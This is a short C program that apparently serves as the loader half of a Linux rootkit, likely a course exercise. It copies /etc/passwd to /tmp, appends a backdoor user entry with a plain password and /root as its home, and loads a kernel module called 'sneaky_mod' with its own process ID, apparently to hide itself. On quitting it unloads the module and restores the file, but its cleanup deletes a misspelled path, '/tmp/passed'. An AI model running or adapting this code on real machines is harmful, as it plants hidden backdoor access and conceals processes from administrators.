#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
int main(){
    printf("sneaky_process pid = %d\n", getpid());
    system("cp /etc/passwd /tmp");
    char* file="/etc/passwd";
    FILE * f = fopen(file, "a");
    if (f == NULL) {
        printf("Cannot open.\n");
        exit(EXIT_FAILURE);
    }
    char * insert="sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
    fputs(insert, f);
    fclose(f);
    char command[100];
    memset(command, 0, 100);
    snprintf(command,100,"insmod sneaky_mod.ko pid=%d", (int)getpid());
    
    int status = system(command);
    if (status == -1) {
        printf("Cannot load.\n");
        return EXIT_FAILURE;
    }

    while (1) {
        if(getchar() == 'q'){
            break;
        }
    }
    
    status = system("rmmod sneaky_mod.ko");
    if (status == -1) {
        printf("Cannot unload.\n");
        return EXIT_FAILURE;
    }
    system("cp /tmp/passwd /etc");
    system("rm -f /tmp/passed");
    return EXIT_SUCCESS;
}
